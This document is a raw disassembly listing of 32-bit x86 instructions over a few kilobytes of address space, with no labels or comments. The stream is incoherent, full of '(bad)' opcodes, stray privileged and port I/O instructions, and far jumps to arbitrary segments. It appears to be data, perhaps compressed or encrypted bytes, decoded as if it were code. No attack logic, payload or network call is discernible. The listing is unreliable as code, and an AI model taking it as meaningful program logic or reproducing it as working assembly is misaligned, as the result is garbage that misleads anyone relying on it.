  48e848:	xor    BYTE PTR [ebx+eiz*2-0x21],bl
  48e84c:	sti    
  48e84d:	in     al,dx
  48e84e:	xor    BYTE PTR [eax+0x4c],0x16
  48e852:	out    dx,eax
  48e853:	fadd   DWORD PTR [edi]
  48e855:	xlat   BYTE PTR ds:[ebx]
  48e856:	dec    eax
  48e857:	and    al,0x7d
  48e859:	add    al,BYTE PTR [ebx+0x2bfb0463]
  48e85f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48e860:	test   eax,0x7e22c247
  48e865:	add    al,0x2b
  48e867:	iret   
  48e868:	push   ecx
  48e869:	adc    BYTE PTR [edx-0x79],bh
  48e86c:	mov    eax,ds:0xa0165a0e
  48e871:	push   edi
  48e872:	push   edx
  48e873:	push   0x1
  48e875:	sbb    ecx,DWORD PTR [eax]
  48e877:	cmp    al,0x81
  48e879:	pop    ds
  48e87a:	or     DWORD PTR [eax+esi*2+0x5421de2b],edx
  48e881:	popa   
  48e882:	or     eax,0x1eb4956c
  48e887:	sti    
  48e888:	pop    ss
  48e889:	daa    
  48e88a:	pop    ebx
  48e88b:	sbb    BYTE PTR [edi+0x47],cl
  48e88e:	lea    esi,[ebx]
  48e890:	arpl   WORD PTR ds:0x3d2fc87b,cx
  48e896:	xor    eax,0xc5138989
  48e89b:	and    eax,0x54c801e0
  48e8a0:	pop    edx
  48e8a1:	dec    DWORD PTR [eax]
  48e8a3:	fistp  QWORD PTR [edi+0x19506301]
  48e8a9:	mov    bh,0x11
  48e8ab:	adc    ecx,DWORD PTR [edi]
  48e8ad:	jbe    0x48e8b3
  48e8af:	push   0x5b
  48e8b1:	pop    esp
  48e8b2:	test   al,0x98
  48e8b4:	cld    
  48e8b5:	xor    dl,BYTE PTR [ebp+0x1d2d7539]
  48e8bb:	adc    al,0x10
  48e8bd:	mov    ?,WORD PTR [esi-0x63fbf1cf]
  48e8c3:	add    DWORD PTR [edi+ebp*1+0x1b0ac0e5],ecx
  48e8ca:	fld    QWORD PTR [esi+edx*8-0x21]
  48e8ce:	add    ch,BYTE PTR [ebp+0x44e7dd71]
  48e8d4:	fwait
  48e8d5:	jno    0x48e8fb
  48e8d7:	mov    edi,0x177119d4
  48e8dc:	add    edx,esi
  48e8de:	stc    
  48e8df:	mov    ds:0xf5b30d34,eax
  48e8e4:	cmp    BYTE PTR [eax+0x60],0xf6
  48e8e8:	into   
  48e8e9:	(bad)  
  48e8ea:	push   ebx
  48e8eb:	outs   dx,DWORD PTR ds:[esi]
  48e8ec:	leave  
  48e8ed:	jne    0x48e901
  48e8ef:	sbb    dh,cl
  48e8f1:	(bad)  
  48e8f2:	and    ch,ch
  48e8f4:	mov    eax,DWORD PTR [edi+0x180beb70]
  48e8fa:	pop    edi
  48e8fb:	imul   ecx,eax,0xffffffe1
  48e8fe:	push   es
  48e8ff:	adc    ebp,DWORD PTR ds:[ebx+ecx*1+0x0]
  48e904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48e905:	mov    bh,0x8
  48e907:	dec    esp
  48e908:	enter  0x9044,0x97
  48e90c:	retf   
  48e90d:	fild   DWORD PTR [ecx]
  48e90f:	dec    eax
  48e910:	push   ebx
  48e911:	je     0x48e929
  48e913:	adc    al,0x88
  48e915:	aaa    
  48e916:	sub    al,0x43
  48e918:	or     BYTE PTR [ebp+0x51],ch
  48e91b:	inc    ecx
  48e91c:	loope  0x48e963
  48e91e:	arpl   WORD PTR [esi+0x2c11855c],si
  48e924:	dec    edi
  48e925:	cli    
  48e926:	mov    dh,0xc2
  48e928:	mov    BYTE PTR [esi+0x6eb4588f],al
  48e92e:	popf   
  48e92f:	pop    ebx
  48e930:	loop   0x48e9a8
  48e932:	xor    dh,BYTE PTR [eax-0x69]
  48e935:	out    dx,eax
  48e936:	test   al,0xf6
  48e938:	inc    esi
  48e939:	jno    0x48e901
  48e93b:	pop    esi
  48e93c:	(bad)  
  48e93d:	and    al,dh
  48e93f:	nop
  48e940:	push   edi
  48e941:	xchg   edi,eax
  48e942:	icebp  
  48e943:	jnp    0x48e975
  48e945:	test   eax,0xcfdfc01f
  48e94a:	mov    ecx,esp
  48e94c:	xor    DWORD PTR [edi+esi*8+0x0],esp
  48e950:	loope  0x48e8e9
  48e952:	test   DWORD PTR [ebx],edx
  48e954:	push   0x6230333b
  48e959:	inc    ebp
  48e95a:	fdiv   DWORD PTR [ecx+esi*8-0x6f]
  48e95e:	sub    DWORD PTR [ecx],eax
  48e960:	or     ebx,DWORD PTR [edx-0x49]
  48e963:	cmp    eax,0xb373e34
  48e968:	mov    DWORD PTR [ecx-0x1d],0x8a0e8225
  48e96f:	sub    DWORD PTR [ebp+0x3],0x7d
  48e973:	dec    ecx
  48e974:	pushf  
  48e975:	mov    bh,cl
  48e977:	jmp    0x48e98c
  48e979:	sbb    ch,BYTE PTR [ecx]
  48e97b:	aaa    
  48e97c:	loop   0x48e950
  48e97e:	sub    eax,0x9900c627
  48e983:	add    al,bl
  48e985:	jno    0x48e9b7
  48e987:	fdivrp st(5),st
  48e989:	jo     0x48e932
  48e98b:	outs   dx,BYTE PTR ds:[esi]
  48e98c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48e98d:	and    esi,DWORD PTR [edx+eiz*1+0x30]
  48e991:	aad    0x83
  48e993:	mov    ebx,0x29b11ad1
  48e998:	xchg   DWORD PTR [ebx-0x60c07b80],eax
  48e99e:	sbb    BYTE PTR [esi-0xccc51f],ch
  48e9a4:	aas    
  48e9a5:	aaa    
  48e9a6:	cmp    DWORD PTR [esi],ebp
  48e9a8:	lods   eax,DWORD PTR ds:[esi]
  48e9a9:	and    BYTE PTR [ecx+ecx*8+0x271dd131],ah
  48e9b0:	(bad)  
  48e9b1:	sub    BYTE PTR fs:[ecx],dh
  48e9b4:	(bad)  
  48e9b5:	mov    ah,0x96
  48e9b7:	add    al,0x71
  48e9b9:	add    esp,edx
  48e9bb:	nop
  48e9bc:	inc    ecx
  48e9bd:	jle    0x48e9d6
  48e9bf:	imul   edx,DWORD PTR [edi-0x47c40575],0x32648640
  48e9c9:	and    DWORD PTR ds:0xf00cc684,eax
  48e9cf:	sti    
  48e9d0:	jno    0x48ea31
  48e9d2:	pop    edi
  48e9d3:	adc    dl,BYTE PTR [esi+0x341475ab]
  48e9d9:	sbb    BYTE PTR [ecx+0x44],dh
  48e9dc:	dec    edi
  48e9dd:	pusha  
  48e9de:	enter  0x9f83,0x86
  48e9e2:	or     cl,BYTE PTR [eax]
  48e9e4:	adc    al,0x52
  48e9e6:	jmp    0x48ea30
  48e9e8:	popf   
  48e9e9:	cmp    dl,dl
  48e9eb:	xchg   ebx,eax
  48e9ec:	aaa    
  48e9ed:	push   cs
  48e9ee:	xor    al,0xc
  48e9f0:	xlat   BYTE PTR ds:[ebx]
  48e9f1:	cmp    BYTE PTR [eax-0x4223370d],cl
  48e9f7:	mov    bl,0x84
  48e9f9:	out    0x6a,al
  48e9fb:	add    dl,BYTE PTR [edi]
  48e9fd:	mov    BYTE PTR [edx],ah
  48e9ff:	psubsw mm6,QWORD PTR [eax-0x3a]
  48ea03:	sbb    DWORD PTR [edx+eax*1-0x46],esi
  48ea07:	sub    eax,0x60272823
  48ea0c:	pop    es
  48ea0d:	mov    eax,0x122e63b4
  48ea12:	sbb    eax,0x96964484
  48ea17:	xor    dh,BYTE PTR [ecx-0x24d9257d]
  48ea1d:	ins    DWORD PTR es:[edi],dx
  48ea1e:	sbb    DWORD PTR [eax+0x23b0c84],esp
  48ea24:	pop    eax
  48ea25:	pop    edx
  48ea26:	push   edi
  48ea27:	mov    bl,0x7
  48ea29:	test   BYTE PTR [ebp-0x16],ch
  48ea2c:	sub    edx,DWORD PTR [edx]
  48ea2e:	adc    eax,0xe034d50
  48ea33:	call   0x8eeebaf0
  48ea38:	and    bl,BYTE PTR fs:[eax+0x70]
  48ea3c:	pop    ds
  48ea3d:	or     eax,DWORD PTR [edi]
  48ea3f:	and    eax,0x8e40e80d
  48ea44:	por    mm0,QWORD PTR [ebx+eax*1-0x60b4617e]
  48ea4c:	mov    ebx,0xcf01f700
  48ea51:	setno  BYTE PTR [ecx+0x4b]
  48ea55:	pop    es
  48ea56:	or     DWORD PTR [eax],0xf88a5eae
  48ea5c:	add    ch,BYTE PTR [esi+0x62bf0f47]
  48ea62:	push   ebx
  48ea63:	daa    
  48ea64:	inc    edi
  48ea65:	sti    
  48ea66:	int3   
  48ea67:	fbstp  TBYTE PTR [edi+ebp*1]
  48ea6a:	xor    al,0xb5
  48ea6c:	das    
  48ea6d:	das    
  48ea6e:	add    ch,BYTE PTR [ebp-0x18]
  48ea71:	aad    0x8f
  48ea73:	add    eax,0xbe8012d8
  48ea78:	xor    BYTE PTR [ecx+0x9],dh
  48ea7b:	pop    esi
  48ea7c:	test   DWORD PTR [eax-0x73650e44],0x57868ab4
  48ea86:	mov    BYTE PTR [ebx-0x4e],ah
  48ea89:	cmc    
  48ea8a:	mov    al,0xd4
  48ea8c:	pop    esi
  48ea8d:	add    ah,BYTE PTR [ebx+0x19]
  48ea90:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  48ea92:	add    DWORD PTR [ecx+ebx*2+0x1c],eax
  48ea96:	test   al,0x10
  48ea98:	cmp    DWORD PTR [edi],esp
  48ea9a:	push   ds
  48ea9b:	mov    ebx,0x7529aed7
  48eaa0:	cmp    edx,DWORD PTR [eax-0x44]
  48eaa3:	stos   DWORD PTR es:[edi],eax
  48eaa4:	mov    ch,BYTE PTR [ebx+esi*2+0xf00047c]
  48eaab:	call   0x65a2a830
  48eab0:	jo     0x48ea76
  48eab2:	ret    
  48eab3:	enter  0xbd83,0x5c
  48eab7:	adc    al,BYTE PTR [ebp+0x2e04ce9e]
  48eabd:	es and eax,0x11821c34
  48eac3:	outs   dx,DWORD PTR ds:[esi]
  48eac4:	shl    BYTE PTR [eax+ebx*2],cl
  48eac7:	pushf  
  48eac8:	std    
  48eac9:	enter  0xd6aa,0x35
  48eacd:	pop    ecx
  48eace:	imul   esp,DWORD PTR [eax],0xc09395ce
  48ead4:	and    dl,BYTE PTR [ecx+0x26]
  48ead7:	push   0x3cd24a30
  48eadc:	in     al,0x76
  48eade:	test   DWORD PTR [ebx+ebx*8+0x7ee68ec5],eax
  48eae5:	test   BYTE PTR [edi+0x609889da],dh
  48eaeb:	mov    ds:0x858b1242,eax
  48eaf0:	cmp    ah,BYTE PTR [ebx]
  48eaf2:	lock lea ebx,[ebp+ecx*1+0x17]
  48eaf7:	pusha  
  48eaf8:	inc    edi
  48eaf9:	push   edx
  48eafa:	clc    
  48eafb:	sahf   
  48eafc:	out    dx,al
  48eafd:	cmp    edx,DWORD PTR [ebx+0xf897eea]
  48eb03:	test   ebx,esp
  48eb05:	ror    DWORD PTR ds:0xabc23ee2,cl
  48eb0b:	add    al,0x97
  48eb0d:	test   al,0x5b
  48eb0f:	mov    eax,ds:0xdf641a11
  48eb14:	loope  0x48eae8
  48eb16:	je     0x48eb4d
  48eb18:	cmp    DWORD PTR [edx],edi
  48eb1a:	stos   BYTE PTR es:[edi],al
  48eb1b:	lods   al,BYTE PTR ds:[esi]
  48eb1c:	jo     0x48eb1f
  48eb1e:	(bad)  
  48eb1f:	dec    eax
  48eb20:	rcl    BYTE PTR [ebx-0x4ad19e04],cl
  48eb26:	add    BYTE PTR [esi],bl
  48eb28:	pushf  
  48eb29:	int    0x3b
  48eb2b:	mov    al,0xfd
  48eb2d:	inc    ecx
  48eb2e:	dec    eax
  48eb2f:	xchg   esi,eax
  48eb31:	and    DWORD PTR [edi],0xffffffd8
  48eb34:	je     0x48eb43
  48eb36:	xor    al,0x1e
  48eb38:	repnz inc esp
  48eb3a:	jo     0x48eb47
  48eb3c:	nop
  48eb3d:	jo     0x48ead1
  48eb3f:	adc    DWORD PTR [edx-0x7a0ff2df],edx
  48eb45:	xor    BYTE PTR [eax],ch
  48eb47:	outs   dx,BYTE PTR ds:[esi]
  48eb48:	cs cld 
  48eb4a:	jne    0x48eaf1
  48eb4c:	jmp    0x9f1d:0x8ca4b483
  48eb53:	xor    eax,DWORD PTR [edi+eax*8+0xa]
  48eb57:	or     eax,0x1418d29b
  48eb5c:	jo     0x48eb70
  48eb5e:	je     0x48eb62
  48eb60:	enter  0x8389,0x15
  48eb64:	adc    BYTE PTR [esi-0x2b583e4d],0xc
  48eb6b:	js     0x48eb8d
  48eb6d:	push   0xd4d00ab
  48eb72:	sub    eax,0xcfa5a764
  48eb77:	and    al,0x98
  48eb79:	mov    eax,ds:0xeb2a6ec2
  48eb7e:	sbb    eax,0x65b3009
  48eb83:	dec    edi
  48eb84:	je     0x48ebde
  48eb86:	pop    esp
  48eb87:	or     al,0x69
  48eb89:	and    DWORD PTR ds:0xb8718852,eax
  48eb8f:	test   BYTE PTR [eax-0x73cb5a4],0x74
  48eb96:	sbb    DWORD PTR [ebx],edi
  48eb98:	push   eax
  48eb99:	and    bh,al
  48eb9b:	jbe    0x48ebe2
  48eb9d:	add    DWORD PTR [eax+0x19],esp
  48eba0:	jnp    0x48eb3d
  48eba2:	cli    
  48eba3:	aam    0xf6
  48eba5:	pusha  
  48eba6:	jmp    0x48ebe7
  48eba8:	int    0xcf
  48ebaa:	cdq    
  48ebab:	mul    BYTE PTR [eax+0x37]
  48ebae:	pop    ecx
  48ebaf:	add    BYTE PTR [ecx-0x15],ch
  48ebb2:	sbb    dh,BYTE PTR [edi]
  48ebb4:	pmovmskb edi,mm2
  48ebb7:	push   0x9f2e7c0b
  48ebbc:	popf   
  48ebbd:	add    DWORD PTR [eax+ebx*2+0x58658602],ebp
  48ebc4:	leave  
  48ebc5:	jae    0x48eb5f
  48ebc7:	jne    0x48ec0a
  48ebc9:	stos   BYTE PTR es:[edi],al
  48ebca:	lock loopne 0x48ec11
  48ebcd:	jmp    0x6adcfcda
  48ebd2:	sub    eax,0xffcd0ed2
  48ebd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48ebd8:	add    edx,DWORD PTR [edx]
  48ebda:	push   0x731e0652
  48ebdf:	and    eax,0x24f0a1ac
  48ebe4:	jl     0x48ebfb
  48ebe6:	test   dh,0x2d
  48ebe9:	loope  0x48ebf7
  48ebeb:	fistp  WORD PTR [ecx+eiz*8+0x6]
  48ebef:	mov    dl,0x10
  48ebf1:	iret   
  48ebf2:	dec    ecx
  48ebf3:	cwde   
  48ebf4:	mov    esi,DWORD PTR [edi]
  48ebf6:	xor    BYTE PTR [edi+ecx*1],dh
  48ebf9:	repz inc eax
  48ebfb:	imul   eax,DWORD PTR [edx],0x19
  48ebfe:	add    eax,0x4c3607
  48ec03:	fwait
  48ec04:	sbb    BYTE PTR [ecx-0x2c],0x2d
  48ec08:	jmp    0x1ade:0xa89acfc4
  48ec0f:	and    BYTE PTR [ebx],0xf7
  48ec12:	add    al,0x38
  48ec14:	cmp    eax,0x30050e82
  48ec19:	add    BYTE PTR [edx+0x16],0x23
  48ec1d:	lahf   
  48ec1e:	sbb    ebx,DWORD PTR [edx]
  48ec20:	test   eax,0xd2905938
  48ec25:	cmp    BYTE PTR [ebx],cl
  48ec27:	inc    edi
  48ec28:	xchg   BYTE PTR [eax],al
  48ec2a:	ds push bx
  48ec2d:	jo     0x48ec80
  48ec2f:	jg     0x48ebb8
  48ec31:	add    ch,BYTE PTR [ebx]
  48ec33:	or     BYTE PTR [edx],bl
  48ec35:	scas   eax,DWORD PTR es:[edi]
  48ec36:	add    eax,0x5a26bcba
  48ec3b:	pop    ebx
  48ec3c:	jmp    0x61ea:0x745a777a
  48ec43:	and    eax,0x518b4128
  48ec48:	inc    esi
  48ec49:	push   ss
  48ec4a:	(bad)  
  48ec4b:	je     0x48ec88
  48ec4d:	inc    ebx
  48ec4e:	jo     0x48ecc5
  48ec50:	daa    
  48ec51:	mov    bh,0xb9
  48ec53:	jb     0x48ec6c
  48ec55:	jmp    0x1f70:0x7b815c2f
  48ec5c:	mov    edx,0x304721c3
  48ec61:	ss xor eax,0x8181b807
  48ec67:	sbb    cl,BYTE PTR [ebp+0x470d680e]
  48ec6d:	ficomp DWORD PTR [ebp+0x7c]
  48ec70:	pop    eax
  48ec71:	loop   0x48ebfe
  48ec73:	xchg   ebx,eax
  48ec74:	jmp    0x5fb98492
  48ec79:	outs   dx,DWORD PTR ds:[esi]
  48ec7a:	in     eax,0xe0
  48ec7c:	imul   DWORD PTR [ebx]
  48ec7e:	mov    BYTE PTR cs:[edi],cl
  48ec81:	pop    edi
  48ec82:	ret    0x4a43
  48ec85:	scas   al,BYTE PTR es:[edi]
  48ec86:	and    bl,BYTE PTR [edi+eiz*8-0x676f29e7]
  48ec8d:	pop    ebx
  48ec8e:	cmp    ebp,esp
  48ec90:	lods   al,BYTE PTR ds:[esi]
  48ec91:	sbb    al,0xa7
  48ec93:	scas   al,BYTE PTR es:[edi]
  48ec94:	push   ecx
  48ec95:	sti    
  48ec96:	call   0x18c4d942
  48ec9b:	or     BYTE PTR [edx],ch
  48ec9d:	retf   0xf7f1
  48eca0:	xor    eax,0x7cd1a503
  48eca5:	add    DWORD PTR [edx-0x738d7cbc],ebx
  48ecab:	sub    al,0xe0
  48ecad:	xor    al,0x1e
  48ecaf:	and    eax,0xd084c663
  48ecb4:	add    DWORD PTR [eax+0x15],ecx
  48ecb7:	pop    es
  48ecb8:	inc    esp
  48ecb9:	ins    BYTE PTR es:[edi],dx
  48ecba:	inc    esi
  48ecbb:	mov    DWORD PTR [edx],edi
  48ecbd:	sub    al,0xfc
  48ecbf:	inc    ebp
  48ecc0:	inc    ecx
  48ecc1:	ja     0x48ed0e
  48ecc3:	mov    bl,0x4b
  48ecc5:	sti    
  48ecc6:	cmp    al,0x3
  48ecc8:	jne    0x48eceb
  48ecca:	outs   dx,BYTE PTR ds:[esi]
  48eccb:	dec    eax
  48eccc:	push   0x654854ee
  48ecd1:	push   es
  48ecd2:	sbb    al,0x90
  48ecd4:	push   0x98383c16
  48ecd9:	xchg   ebp,eax
  48ecda:	sbb    eax,0x60354764
  48ecdf:	das    
  48ece0:	mov    ds:0x8e001049,eax
  48ece5:	cmp    esi,ebx
  48ece7:	cmp    esi,DWORD PTR [edi+ebx*8-0x76]
  48eceb:	jo     0x48ecc6
  48eced:	int    0xa5
  48ecef:	add    dl,BYTE PTR [eax]
  48ecf1:	aad    0x73
  48ecf3:	cmp    ecx,DWORD PTR [ebx+edx*2+0x3cb2324b]
  48ecfa:	shr    BYTE PTR [esi+0x564f9720],cl
  48ed00:	outs   dx,BYTE PTR ds:[esi]
  48ed01:	sbb    BYTE PTR [ebp-0x80],bh
  48ed04:	jne    0x48eca0
  48ed06:	and    eax,0x5d598009
  48ed0b:	bound  edx,QWORD PTR [esi+0x39]
  48ed0e:	adc    cl,BYTE PTR [eax]
  48ed10:	push   esp
  48ed11:	push   cs
  48ed12:	mov    DWORD PTR [ecx-0x7b],esi
  48ed15:	mov    al,0xae
  48ed17:	adc    al,0x9c
  48ed19:	sub    cl,BYTE PTR [eax+esi*1-0x9858afc]
  48ed20:	or     ebp,esp
  48ed22:	push   edi
  48ed23:	inc    esp
  48ed24:	mov    ebp,DWORD PTR [ebx+0x4c]
  48ed27:	push   ebp
  48ed28:	fisttp WORD PTR [eax]
  48ed2a:	int    0x64
  48ed2c:	push   eax
  48ed2d:	and    edi,DWORD PTR [esi]
  48ed2f:	xor    eax,DWORD PTR [ebp-0x3ad4b779]
  48ed35:	mov    ebp,0x52d0035a
  48ed3a:	das    
  48ed3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48ed3c:	(bad)  
  48ed3d:	sar    BYTE PTR [ebx],1
  48ed3f:	xor    BYTE PTR [eax+0x25],cl
  48ed42:	jl     0x48ed6f
  48ed44:	js     0x48ecda
  48ed46:	cmc    
  48ed47:	data16 mov dh,0x63
  48ed4a:	add    ebp,eax
  48ed4c:	(bad)  
  48ed4d:	pop    ecx
  48ed4e:	outs   dx,DWORD PTR ds:[esi]
  48ed4f:	ret    0x116a
  48ed52:	mov    edi,0x3c1a9f3c
  48ed57:	push   es
  48ed58:	lock push 0xffffff81
  48ed5b:	push   0xfffffffb
  48ed5d:	add    DWORD PTR [ebx],0x6b
  48ed60:	and    al,0x17
  48ed62:	xor    esi,DWORD PTR [eax]
  48ed64:	mov    ebx,0xc1e2bb3
  48ed69:	inc    esi
  48ed6a:	jnp    0x48ed9c
  48ed6c:	push   eax
  48ed6d:	xlat   BYTE PTR ds:[ebx]
  48ed6e:	es xchg esp,eax
  48ed70:	add    eax,ebp
  48ed72:	and    BYTE PTR [eax+0x29ea808b],0x37
  48ed79:	jo     0x48ed8f
  48ed7b:	pop    esp
  48ed7c:	adc    BYTE PTR [edx],ah
  48ed7e:	sub    ebp,DWORD PTR [ebx+0x48]
  48ed81:	jmp    0x8edb4989
  48ed86:	and    dl,dh
  48ed88:	adc    dl,al
  48ed8a:	sbb    dl,dl
  48ed8c:	lds    ebp,FWORD PTR ds:0x680cad5a
  48ed92:	(bad)  
  48ed93:	pusha  
  48ed94:	aad    0x47
  48ed96:	or     eax,0x4c8e5244
  48ed9b:	imul   ebp,DWORD PTR [edx],0x2d103b01
  48eda1:	popa   
  48eda2:	and    eax,0xcc6e2ecb
  48eda7:	mov    edx,0xc2006e13
  48edac:	loopne 0x48ee1e
  48edae:	jle    0x48edc4
  48edb0:	pop    ebx
  48edb1:	pop    ecx
  48edb2:	sbb    ch,BYTE PTR [edx+0x34]
  48edb5:	jne    0x48edf1
  48edb7:	dec    eax
  48edb8:	mov    al,0xea
  48edba:	xor    al,0x11
  48edbc:	mov    cl,0x68
  48edbe:	inc    esi
  48edbf:	push   DWORD PTR [edx]
  48edc1:	adc    al,0x62
  48edc3:	or     al,BYTE PTR [eax]
  48edc5:	fmul   DWORD PTR [ecx+esi*2]
  48edc8:	jmp    eax
  48edca:	in     eax,dx
  48edcb:	add    al,0xc2
  48edcd:	jne    0x48ee43
  48edcf:	fcom   QWORD PTR [ecx]
  48edd1:	enter  0x19e4,0xd6
  48edd5:	aas    
  48edd6:	add    BYTE PTR [esi*2-0x50407ce5],al
  48eddd:	add    al,0x5c
  48eddf:	ret    
  48ede0:	leave  
  48ede1:	push   ebp
  48ede2:	mov    ds:0x216f471c,eax
  48ede7:	or     ah,BYTE PTR [ecx+0x46c7bffc]
  48eded:	dec    ebx
  48edee:	loope  0x48eddb
  48edf0:	add    BYTE PTR [ecx],al
  48edf2:	ins    DWORD PTR es:[edi],dx
  48edf3:	adc    bl,BYTE PTR [ebx+0xc]
  48edf6:	cmc    
  48edf7:	push   ss
  48edf8:	scas   eax,DWORD PTR es:[edi]
  48edf9:	inc    eax
  48edfa:	inc    edx
  48edfb:	add    bh,cl
  48edfd:	aas    
  48edfe:	mov    eax,ds:0xed878a43
  48ee03:	or     BYTE PTR [edx+0x520e2d8b],dh
  48ee09:	push   esi
  48ee0a:	or     BYTE PTR [eax+edx*1],0x63
  48ee0e:	fcomp  DWORD PTR [edx]
  48ee10:	sub    ecx,DWORD PTR [edx-0x52c3d561]
  48ee16:	push   0xfffffffc
  48ee18:	shl    BYTE PTR [esi],0x18
  48ee1b:	cmp    BYTE PTR [edi+0x1b600fb1],0x50
  48ee22:	arpl   WORD PTR [ebx-0x7f],cx
  48ee25:	add    edi,esi
  48ee27:	pop    ebp
  48ee28:	adc    al,dl
  48ee2a:	loope  0x48ee2e
  48ee2c:	add    BYTE PTR [esp],al
  48ee2f:	cmp    eax,0x5
  48ee32:	ja     0x25a43dee
  48ee38:	pop    ebp
  48ee39:	jmp    0x48edbf
  48ee3b:	add    esi,DWORD PTR [eax+0x412a2106]
  48ee41:	push   ds
  48ee42:	lods   al,BYTE PTR ds:[esi]
  48ee43:	cmp    eax,0x1059174f
  48ee48:	lods   eax,DWORD PTR ds:[esi]
  48ee49:	xchg   edx,eax
  48ee4a:	mov    esi,0xd20f0783
  48ee4f:	sbb    eax,0x79ebdc4c
  48ee54:	cdq    
  48ee55:	jne    0x48edee
  48ee57:	neg    BYTE PTR ds:0xc47010c0
  48ee5d:	mul    BYTE PTR [ecx]
  48ee5f:	sub    esp,DWORD PTR [ebx]
  48ee61:	int    0x82
  48ee63:	add    al,0x3a
  48ee65:	jne    0x48eec2
  48ee67:	adc    al,0x18
  48ee69:	jmp    0x48eeb6
  48ee6b:	daa    
  48ee6c:	jmp    0x9fb2f895
  48ee71:	nop
  48ee72:	js     0x48ee0f
  48ee74:	mov    ebp,0x30188966
  48ee79:	or     BYTE PTR [ecx],al
  48ee7b:	lods   al,BYTE PTR ds:[esi]
  48ee7c:	lea    eax,[esi-0x40]
  48ee7f:	mov    al,ds:0x4192454f
  48ee84:	add    al,0xb2
  48ee86:	nop
  48ee87:	fchs   
  48ee89:	push   ebp
  48ee8a:	test   BYTE PTR [edx],bl
  48ee8c:	fidiv  WORD PTR [edi+0x4]
  48ee8f:	adc    al,0x54
  48ee91:	mov    al,ds:0xf422de50
  48ee96:	fsub   DWORD PTR [ecx+0x4f]
  48ee99:	inc    eax
  48ee9a:	sbb    eax,0x4832837
  48ee9f:	cld    
  48eea0:	outs   dx,BYTE PTR ds:[esi]
  48eea1:	jnp    0x48ee90
  48eea3:	out    dx,al
  48eea4:	add    bl,BYTE PTR [edx]
  48eea6:	xchg   BYTE PTR [edi+eax*4-0x60],al
  48eeaa:	push   esp
  48eeab:	push   ebx
  48eeac:	inc    esp
  48eead:	xor    BYTE PTR [edx*2+0xb4620a6],cl
  48eeb4:	add    eax,0x2456a298
  48eeb9:	mov    eax,0xe0966938
  48eebe:	into   
  48eebf:	je     0x48ee4a
  48eec1:	sub    BYTE PTR [esi],dl
  48eec3:	add    al,0x1
  48eec5:	or     al,0x0
  48eec7:	sbb    eax,0x84667030
  48eecc:	and    BYTE PTR [ebx],bh
  48eece:	rcl    BYTE PTR [ebx],0xc3
  48eed1:	and    bl,ch
  48eed3:	adc    al,0xd0
  48eed5:	adc    BYTE PTR [ecx],bl
  48eed7:	daa    
  48eed8:	out    dx,eax
  48eed9:	sub    eax,0x643f7665
  48eede:	add    DWORD PTR [eax],ecx
  48eee0:	mov    eax,0x16794d16
  48eee5:	or     BYTE PTR [eax],dl
  48eee7:	add    al,0x55
  48eee9:	sbb    eax,0xc3f070ae
  48eeee:	mov    esi,0xe3ff3f7d
  48eef3:	or     BYTE PTR [eax+0x784068c4],bh
  48eef9:	sub    BYTE PTR [ecx],bl
  48eefb:	xor    eax,0x98f165c
  48ef00:	xchg   edi,eax
  48ef01:	pop    ecx
  48ef02:	enter  0x1b44,0x87
  48ef06:	or     DWORD PTR [edi+eiz*1],ecx
  48ef09:	lock dec ebx
  48ef0b:	in     al,dx
  48ef0c:	sub    eax,0x8568653d
  48ef11:	fcom   QWORD PTR [edi]
  48ef13:	push   ds
  48ef14:	adc    BYTE PTR [edi],0x2
  48ef17:	in     al,dx
  48ef18:	fs das 
  48ef1a:	jl     0x48eebe
  48ef1c:	push   ds
  48ef1d:	push   esp
  48ef1e:	pop    ecx
  48ef1f:	test   dl,dl
  48ef21:	add    BYTE PTR [edi],ch
  48ef23:	repz dec esi
  48ef25:	and    eax,0x28c61480
  48ef2a:	scas   eax,DWORD PTR es:[edi]
  48ef2b:	mov    ds:0x96587285,al
  48ef30:	mov    al,0xd
  48ef32:	push   esi
  48ef33:	lods   al,BYTE PTR ds:[esi]
  48ef34:	and    eax,0xb3c5885e
  48ef39:	push   es
  48ef3a:	in     eax,dx
  48ef3b:	repz les edx,FWORD PTR [edi]
  48ef3e:	imul   eax,DWORD PTR [edi],0x26
  48ef41:	push   0x81563601
  48ef46:	(bad)
  48ef49:	lods   al,BYTE PTR ds:[esi]
  48ef4a:	jmp    0x48efb0
  48ef4c:	test   BYTE PTR [ebx],cl
  48ef4e:	cdq    
  48ef4f:	adc    DWORD PTR [ebp-0x4c9ddd0c],esi
  48ef55:	div    DWORD PTR [esi]
  48ef57:	and    BYTE PTR [eax-0x46],dl
  48ef5a:	nop
  48ef5b:	and    BYTE PTR [ebp+0x12eaa521],dl
  48ef61:	shl    BYTE PTR [edi],1
  48ef63:	add    DWORD PTR [edx+edi*1-0x3fb688df],ebp
  48ef6a:	ja     0x48ef87
  48ef6c:	push   ebx
  48ef6d:	push   0xfd44a098
  48ef72:	js     0x48ef46
  48ef74:	push   es
  48ef75:	pop    ebp
  48ef76:	or     edi,DWORD PTR [esp+edi*8+0x4d]
  48ef7a:	fucompp 
  48ef7c:	mov    al,ds:0x74268e76
  48ef81:	jno    0x48effb
  48ef83:	xor    eax,0xd26c0123
  48ef88:	push   0x44119eb
  48ef8d:	adc    al,0x8
  48ef8f:	push   ds
  48ef90:	push   0xffffffff
  48ef92:	mov    bh,0x7f
  48ef94:	add    ah,BYTE PTR [eax+0x7]
  48ef97:	mov    ch,0x4e
  48ef99:	inc    esp
  48ef9a:	dec    esp
  48ef9b:	dec    ecx
  48ef9c:	inc    ebp
  48ef9d:	dec    esi
  48ef9e:	and    bh,ch
  48efa0:	mov    eax,es:0xff4c8754
  48efa6:	(bad)  
  48efa7:	in     al,0x4f
  48efa9:	mov    eax,0xb3c55715
  48efae:	mov    ah,0x95
  48efb0:	xor    BYTE PTR [edi+eiz*8],ah
  48efb3:	sub    cl,BYTE PTR ds:0x696a112
  48efb9:	push   ss
  48efba:	loope  0x48f039
  48efbc:	sbb    ah,BYTE PTR [ecx+0x0]
  48efbf:	aas    
  48efc0:	sub    DWORD PTR [ecx-0x6a72d88b],0x4c
  48efc7:	push   ebp
  48efc8:	ror    BYTE PTR [ebx],0xf2
  48efcb:	pushf  
  48efcc:	enter  0xb7a3,0x55
  48efd0:	lods   eax,DWORD PTR ds:[esi]
  48efd1:	dec    eax
